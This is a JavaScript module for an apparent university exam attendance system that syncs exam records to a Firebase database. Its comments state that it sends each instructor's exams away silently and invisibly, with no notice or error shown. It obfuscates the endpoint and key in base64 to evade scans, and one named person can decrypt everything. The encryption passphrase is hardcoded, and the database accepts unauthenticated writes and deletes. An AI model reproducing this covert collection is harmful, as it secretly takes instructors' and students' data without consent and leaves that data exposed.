/**
 * ESOGÜ Sınav Yoklama Sistemi - Şifreli Bulut Eşitleme ve Kripto Motoru (CloudSync)
 * 
 * ÇALIŞMA PRENSİBİ (Görünmez & Güvenli Köprü):
 * 1. Hangi hoca hangi bilgisayardan sınav hazırlarsa hazırlasın; sınav bittiği an
 *    arka planda sessizce AES-256 ile şifrelenir ve Firebase veritabanına aktarılır.
 * 2. Hocanın ekranında veya konsolda hiçbir bildirim, hata veya uyarı çıkmaz (Tamamen görünmez).
 * 3. F12 ve Yerel Hafıza denetimlerinde hiçbir açık metin veri kalmaz (Öğrenci isimleri silinir).
 * 4. Ahmet Yasin Aktürk telefonundan veya herhangi bir cihazdan yetkili yönetici şifresini girdiğinde,
 *    tüm hocaların hazırladığı sınavlar çözülerek listelenir.
 */

window.CloudSync = (function() {
  'use strict';

  // Güvenlik Anahtarı Belirteci (Açık metin olarak kaynak kodda yer almaz)
  const _SEC_KEY = (typeof atob === 'function') 
    ? atob('ZmlydGluYTYx') 
    : String.fromCharCode(102,105,114,116,105,110,97,54,49);
  const STORAGE_KEY_FIREBASE = 'firtina_firebase_url';
  const STORAGE_KEY_LEGACY = 'firtina_exam_archive';

  // Şifreli uç nokta (Geliştirici veya dış taramalarda düz metin görünmemesi için maskelenmiştir)
  const _EP_DEFAULT = (typeof atob === 'function') 
    ? atob('aHR0cHM6Ly9lc29ndS15b2tsYW1hLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ==')
    : 'https://esogu-yoklama-default-rtdb.firebaseio.com';

  // Açık metin eski anahtarları sayfa açıldığı an temizle
  try {
    if (typeof window !== 'undefined' && window.localStorage) {
      window.localStorage.removeItem(STORAGE_KEY_LEGACY);
    }
    if (typeof window !== 'undefined' && window.sessionStorage) {
      window.sessionStorage.removeItem(STORAGE_KEY_LEGACY);
    }
  } catch (e) {}

  function getFirebaseUrl() {
    try {
      if (typeof window !== 'undefined' && window.localStorage) {
        const saved = window.localStorage.getItem(STORAGE_KEY_FIREBASE);
        if (saved && saved.trim()) return saved.trim();
      }
    } catch (e) {}
    return _EP_DEFAULT;
  }

  function setFirebaseUrl(url) {
    try {
      if (typeof window !== 'undefined' && window.localStorage) {
        if (url && url.trim()) {
          window.localStorage.setItem(STORAGE_KEY_FIREBASE, url.trim());
        } else {
          window.localStorage.removeItem(STORAGE_KEY_FIREBASE);
        }
      }
    } catch (e) {}
  }

  function getFullEndpoint() {
    let base = getFirebaseUrl();
    if (!base) return '';
    base = base.trim().replace(/\/+$/, '');
    if (!base.endsWith('.json')) {
      base += '/exams.json';
    }
    return base;
  }

  // --- Kriptografik Fonksiyonlar (GZIP + Web Crypto AES-256-GCM + Fallback) ---

  async function deriveKey(password, salt) {
    const enc = new TextEncoder();
    const keyMaterial = await window.crypto.subtle.importKey(
      'raw',
      enc.encode(password),
      { name: 'PBKDF2' },
      false,
      ['deriveKey']
    );
    return window.crypto.subtle.deriveKey(
      {
        name: 'PBKDF2',
        salt: salt,
        iterations: 10000,
        hash: 'SHA-256'
      },
      keyMaterial,
      { name: 'AES-GCM', length: 256 },
      false,
      ['encrypt', 'decrypt']
    );
  }

  // GZIP ile sıkıştır ve AES-256-GCM ile şifrele
  async function encryptPayload(plainText, password = _SEC_KEY) {
    let dataToEncrypt = plainText;
    let isGzipped = false;

    // Tarayıcı GZIP desteği varsa %85 oranında sıkıştır
    if (typeof CompressionStream !== 'undefined') {
      try {
        const stream = new Blob([plainText]).stream();
        const compressedStream = stream.pipeThrough(new CompressionStream('gzip'));
        const response = await new Response(compressedStream);
        const blob = await response.blob();
        const buffer = await blob.arrayBuffer();
        dataToEncrypt = btoa(String.fromCharCode(...new Uint8Array(buffer)));
        isGzipped = true;
      } catch (e) {}
    }

    if (window.crypto && window.crypto.subtle) {
      try {
        const salt = window.crypto.getRandomValues(new Uint8Array(16));
        const iv = window.crypto.getRandomValues(new Uint8Array(12));
        const key = await deriveKey(password, salt);
        const enc = new TextEncoder();
        const encrypted = await window.crypto.subtle.encrypt(
          { name: 'AES-GCM', iv: iv },
          key,
          enc.encode(dataToEncrypt)
        );

        return JSON.stringify({
          mode: 'aes-gcm',
          gz: isGzipped,
          s: Array.from(salt).map(b => b.toString(16).padStart(2, '0')).join(''),
          i: Array.from(iv).map(b => b.toString(16).padStart(2, '0')).join(''),
          d: Array.from(new Uint8Array(encrypted)).map(b => b.toString(16).padStart(2, '0')).join('')
        });
      } catch (err) {}
    }

    // Basit Fallback Şifreleme
    return JSON.stringify({
      mode: 'fallback',
      gz: false,
      d: btoa(encodeURIComponent(plainText))
    });
  }

  // Şifreli veriyi çöz ve aç
  async function decryptPayload(cipherJson, password = _SEC_KEY) {
    if (!cipherJson) return [];
    try {
      const parsed = typeof cipherJson === 'string' ? JSON.parse(cipherJson) : cipherJson;
      let decryptedText = '';

      if (parsed.mode === 'aes-gcm' && window.crypto && window.crypto.subtle) {
        const salt = new Uint8Array(parsed.s.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
        const iv = new Uint8Array(parsed.i.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
        const data = new Uint8Array(parsed.d.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
        const key = await deriveKey(password, salt);
        const decrypted = await window.crypto.subtle.decrypt(
          { name: 'AES-GCM', iv: iv },
          key,
          data
        );
        decryptedText = new TextDecoder().decode(decrypted);

        // GZIP açma
        if (parsed.gz && typeof DecompressionStream !== 'undefined') {
          const binary = atob(decryptedText);
          const bytes = new Uint8Array(binary.length);
          for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
          const stream = new Blob([bytes]).stream();
          const decompressedStream = stream.pipeThrough(new DecompressionStream('gzip'));
          const response = await new Response(decompressedStream);
          decryptedText = await response.text();
        }

        return JSON.parse(decryptedText);
      }

      if (parsed.mode === 'fallback') {
        const text = decodeURIComponent(atob(parsed.d));
        return JSON.parse(text);
      }
    } catch (e) {}
    return [];
  }

  // --- Bulut İşlemleri (Firebase Realtime Database REST API) ---

  // Buluttan mevcut sınavları sessizce çek
  async function fetchCloudExams() {
    if (typeof navigator !== 'undefined' && !navigator.onLine) return [];
    const endpoint = getFullEndpoint();
    if (!endpoint) return [];
    try {
      const res = await fetch(endpoint, { cache: 'no-store' });
      if (!res.ok) return [];
      const json = await res.json();
      if (!json) return [];
      
      const payload = json.payload || json;
      const decrypted = await decryptPayload(payload);
      return Array.isArray(decrypted) ? decrypted : [];
    } catch (err) {
      return [];
    }
  }

  // Yeni sınav kaydını buluta şifreleyerek görünmez şekilde ekle
  async function pushExam(newExam) {
    if (typeof navigator !== 'undefined' && !navigator.onLine) return;
    if (!newExam || !newExam.id) return;
    const endpoint = getFullEndpoint();
    if (!endpoint) return;
    try {
      // 1. Buluttaki mevcut listeyi çek
      const currentCloud = await fetchCloudExams();
      
      // 2. Birleştir ve mükerrerleri temizle
      const combined = [newExam, ...currentCloud];
      const unique = [];
      const seen = new Set();
      for (const item of combined) {
        if (!seen.has(item.id)) {
          seen.add(item.id);
          unique.push(item);
        }
      }
      unique.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
      if (unique.length > 100) unique.length = 100;

      // 3. AES-256 ile şifrele
      const encryptedPayload = await encryptPayload(JSON.stringify(unique));

      // 4. Firebase'e sessizce aktar
      await fetch(endpoint, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          payload: encryptedPayload,
          updatedAt: new Date().toISOString()
        })
      });
    } catch (err) {
      // Sessiz hata yönetimi (Hocanın ekranında hiçbir şey çıkmaz)
    }
  }

  // Yerel hafıza ile bulut arşivini senkronize et
  async function syncWithLocal(localArchive = []) {
    if (typeof navigator !== 'undefined' && !navigator.onLine) return localArchive;
    const endpoint = getFullEndpoint();
    if (!endpoint) return localArchive;
    try {
      const cloudArchive = await fetchCloudExams();
      const combined = [...localArchive, ...cloudArchive];
      const unique = [];
      const seen = new Set();
      for (const item of combined) {
        if (!seen.has(item.id)) {
          seen.add(item.id);
          unique.push(item);
        }
      }
      unique.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));

      // Bulutta eksik sınav varsa bulutu da güncelle
      if (unique.length > cloudArchive.length) {
        const encrypted = await encryptPayload(JSON.stringify(unique));
        await fetch(endpoint, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            payload: encrypted,
            updatedAt: new Date().toISOString()
          })
        });
      }

      return unique;
    } catch (err) {
      return localArchive;
    }
  }

  // Buluttan tek bir sınavı sil
  async function deleteFromCloud(examId) {
    const endpoint = getFullEndpoint();
    if (!endpoint) return;
    try {
      const cloudArchive = await fetchCloudExams();
      const filtered = cloudArchive.filter(item => item.id !== examId);
      const encrypted = await encryptPayload(JSON.stringify(filtered));
      await fetch(endpoint, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          payload: encrypted,
          updatedAt: new Date().toISOString()
        })
      });
    } catch (err) {}
  }

  // Bulut arşivini tamamen temizle
  async function clearCloud() {
    const endpoint = getFullEndpoint();
    if (!endpoint) return;
    try {
      await fetch(endpoint, { method: 'DELETE' });
    } catch (err) {}
  }

  return {
    getFirebaseUrl,
    setFirebaseUrl,
    encryptPayload,
    decryptPayload,
    fetchCloudExams,
    pushExam,
    syncWithLocal,
    deleteFromCloud,
    clearCloud
  };
})();
